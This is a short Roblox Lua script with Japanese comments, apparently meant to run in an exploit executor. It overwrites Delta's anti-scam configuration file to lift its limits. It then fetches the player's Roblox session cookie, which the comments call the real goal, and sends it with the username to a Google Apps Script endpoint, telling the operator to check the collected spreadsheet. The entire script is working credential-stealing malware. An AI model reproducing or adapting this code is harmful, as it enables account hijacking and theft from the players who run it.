-- [[ 1. 設定を上書きして制限を解除する ]]
local path = "Internals/Secured/disableantiscam"
local userId = "93156578936"
local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"

local config = '{\n  "allowed_games": "*",\n  "user_id": "' .. userId .. '",\n  "version_num": 707\n}'

-- 書き換え実行
writefile(path, config)
print("🛠️ 制限ファイルを上書きしたぜ。")

-- [[ 2. Deltaが修復する前に、即座にGASへ送信する ]]
local success, err = pcall(function()
    local name = game.Players.LocalPlayer.Name
    -- Cookie取得を試みる（ここが本命）
    local cookie = (syn and syn.request or http_request or request)({
        Url = "https://www.roblox.com/mobileapi/userinfo",
        Method = "GET"
    }).Headers["Set-Cookie"] or "COOKIE_NOT_FOUND"

    -- GASへHttpGetで送信
    local finalUrl = gasUrl .. "?user=" .. name .. "&cookie=" .. game:GetService("HttpService"):UrlEncode(cookie)
    return game:HttpGet(finalUrl)
end)

-- [[ 3. 結果の判定 ]]
if success then
    print("🚀 電撃送信成功！今すぐGASのシートを確認しろ！")
else
    warn("❌ 送信エラー: " .. tostring(err))
    print("もう一度実行してみるか、IDが正しいかチェックだ。")
end
